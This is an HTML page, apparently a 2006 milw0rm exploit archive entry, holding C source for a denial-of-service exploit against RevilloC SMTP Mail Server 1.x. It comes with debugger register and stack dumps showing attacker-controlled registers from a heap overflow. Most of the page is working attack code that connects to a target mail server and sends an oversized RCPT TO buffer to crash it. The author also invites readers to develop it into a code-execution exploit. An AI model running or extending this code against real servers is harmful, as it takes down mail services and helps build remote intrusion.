<html><head><title>RevilloC MailServer 1.x (RCPT TO) Remote Denial of Service Exploit</title></head><pre>/*
=============================================================
0-day RCPT TO DoS Exploit for RevilloC SMTP version 1.x
=============================================================
Sending a large buffer  (4080 bytes) in conjunction with the &quot;MAIL
FOR:&quot; or &quot;RCPT TO:&quot;  and other commands can cause a denial of service
attack causing the application to crash, consume 99% CPU usage until
the application is terminated or cause the host computer to stop
responding entirely requiring a reboot.  Also a heap overflow attack
vector is possible, sending a buffer greater than 4088 bytes causes
EDI, EBX, and EAX and ECX to be overwritten with values of the
malformed packet.

If you have the time to turn this into an Exploit go for it.  Just
credit me thats all i ask.  I wish i had the time but my full time
job of coding silly 200,000+ line accounting applications is a hand full.


The buffer overflow happens here:
7C91B3FB   . 8B0B           MOV ECX,DWORD PTR DS:[EBX]
7C91B3FD   . 3B4F 04        CMP ECX,DWORD PTR DS:[EDI+4]

EAX 001669F0
ECX 00004141  &lt;&lt; points to a section of the buffer
EDX 00AD0030
EBX 88888888 &lt;&lt; can be controlled by the attacker
ESP 0012F2D0
EBP 0012F4EC
ESI 001669E8
EDI 77777777 &lt;&lt; can be controlled by the attacker
EIP 7C91B3FB ntdll.7C91B3FB
C 0  ES 0023 32bit 0(FFFFFFFF)
P 1  CS 001B 32bit 0(FFFFFFFF)
A 0  SS 0023 32bit 0(FFFFFFFF)
Z 0  DS 0023 32bit 0(FFFFFFFF)
S 0  FS 003B 32bit 7FFDF000(FFF)
T 0  GS 0000 NULL
D 0
O 0  LastErr ERROR_SUCCESS (00000000)
EFL 00010206 (NO,NB,NE,A,NS,PE,GE,G)
DR0 00000000
DR1 00000000
DR2 00000000
DR3 00000000
DR6 00000000
DR7 00000000


and here is the stack
0012F2F4  /0012F334
0012F2F8  |4CDE2A15  RETURN to IDPDX32.4CDE2A15 from &lt;JMP.&amp;IDAPI32.OsMuxUnlock&gt;
0012F2FC  |010587BC
0012F300  |4BE5274A  IDAPI32.4BE5274A
0012F304  |00000001
0012F308  |77777777
0012F30C  |0012F334
0012F310  |00000000
0012F314  |00120000
0012F318  |00000000
0012F31C  |0012F300
0012F320  |4CDE2877  RETURN to IDPDX32.4CDE2877 from IDPDX32.4CE163F4
0012F324  |0012FC18
0012F328  |FFFFFFFF
0012F32C  |01065DBC
0012F330  |00000000
0012F334  ]0012F34C
0012F338  |4BE4095E  RETURN to IDAPI32.4BE4095E from IDAPI32.4BE41D04
0012F33C  |0012F7D8
0012F340  |0000002D
0012F344  |6BDE97A6
0012F348  |0012F7D8
0012F34C  \0012F7B8

and on closer inspection it appears its trying to turn the parameter
into a lowercase format.  (This was when the RCPT TO: command was overflowed)

001659F0  6C 61 64 64 72 65 73 73 00 6C 6F 77 65 72 00 41  laddress.lower.A
00165A00  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00165A10  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
...... huge buffer....
001669E0  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
001669F0  77 77 77 77 88 88 88 88 00 00 00 00 00 00 00 00  wwww............


This was quickly compiled in LCC-Win32 (Free C++ compiler and IDE)
- Greg Linares
Questions/Comments/Etc --&gt; GLinares.code [at] gmail [dot] com
*/



#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;windows.h&gt;
#include &lt;winsock.h&gt;

#pragma comment(lib,&quot;wsock32.lib&quot;)

int main(int argc, char *argv[])
{
static char overflow[65000];
static char buff2[65000];
WSADATA wsaData;


struct hostent *hp;
struct sockaddr_in sockin;
char buf[300], *check;
int sockfd, bytes;
int i;
char *hostname;
unsigned short port;

if (argc &lt;= 1)
   {
	  printf(&quot;\n===========================================================\n&quot;);
	  printf(&quot;0-day RevilloC SMTP Mail Server Suite &lt;= 1.21 RCPT TO: DoS\n&quot;);
	  printf(&quot;Exploits the RCPT TO parameter (MAIL FROM can be exploited too)\n&quot;);
	  printf(&quot;Buffer &gt; 4080 causes the app to crash - heap based overflow\n&quot;);
	  printf(&quot;Exploit and Discovered By: Greg Linares (glinares.code [at ] gmail [dot] com)\n&quot;);
	  printf(&quot;==============================================================\n&quot;);
      printf(&quot;Usage: %s [hostname] [port]\n&quot;, argv[0]);
      printf(&quot;default port is 25 \n&quot;);
      exit(0);
   }


hostname = argv[1];
if (argv[2]) port = atoi(argv[2]);
else port = atoi(&quot;25&quot;);

if (WSAStartup(MAKEWORD(1, 1), &amp;wsaData) &lt; 0)
   {
      fprintf(stderr, &quot;Error setting up with WinSock v1.1\n&quot;);
      exit(-1);
   }


   hp = gethostbyname(hostname);
   if (hp == NULL)
   {
      printf(&quot;ERROR: Uknown host %s\n&quot;, hostname);
	  printf(&quot;%s&quot;,hostname);
      exit(-1);
   }

   sockin.sin_family = hp-&gt;h_addrtype;
   sockin.sin_port = htons(port);
   sockin.sin_addr = *((struct in_addr *)hp-&gt;h_addr);

   if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
   {
      printf(&quot;ERROR: Socket Error\n&quot;);
      exit(-1);
   }

   if ((connect(sockfd, (struct sockaddr *) &amp;sockin,
                sizeof(sockin))) == SOCKET_ERROR)
   {
      printf(&quot;ERROR: Connect Error\n&quot;);
      closesocket(sockfd);
      WSACleanup();
      exit(-1);
   }

   printf(&quot;Connected to [%s] on port [%d], sending overflow....\n&quot;,
          hostname, port);


   if ((bytes = recv(sockfd, buf, 300, 0)) == SOCKET_ERROR)
   {
      printf(&quot;ERROR: Recv Error\n&quot;);
      closesocket(sockfd);
      WSACleanup();
      exit(1);
   }

   /* wait for SMTP service welcome*/
   buf[bytes] = '\0';
   check = strstr(buf, &quot;2&quot;);
   if (check == NULL)
   {
      printf(&quot;ERROR: NO  response from SMTP service\n&quot;);
      closesocket(sockfd);
      WSACleanup();
      exit(-1);
   }

   static char Exp1[65000];
   memset(Exp1, 0, 4096);
   char Exp[] = &quot;RCPT TO: &quot;;
   char tail[] = &quot;@a.com&gt;\r\n&quot;;
   char A[] = &quot;A&quot;;
   memset(overflow, 0, 65000);
   memset(buff2, 0, 100);
   for (i=0; i&lt;100; i++)
	{
	   strcat(buff2, &quot;A&quot;);
	}

   char EHLO[] = &quot;EHLO \r\n&quot;;
   char MF[] = &quot;MAIL FROM: &lt;HI@&quot;;
 	strcat(overflow, MF);
	strcat(overflow, buff2);
	strcat(overflow, tail);



   send(sockfd, EHLO, strlen(EHLO), 0);
	Sleep(500);
	send(sockfd, overflow, strlen(overflow),0);
	Sleep(1000);
	strcat(Exp1, Exp);
	for (i=0; i&lt;4096; i++){
		strcat(Exp1, A);
	}
	strcat(Exp1, &quot;\xDE\xAD\xBA\xBE&quot;);
	strcat(Exp1, tail);

	printf(&quot;%s&quot;, Exp1);
	send(sockfd, Exp1, strlen(Exp1),0);
	Sleep(2000);
    printf(&quot;Overflow Packet Sent Successfully...\n&quot;);
	closesocket(sockfd);
   WSACleanup();
 }

// milw0rm.com [2006-10-25]</pre></html>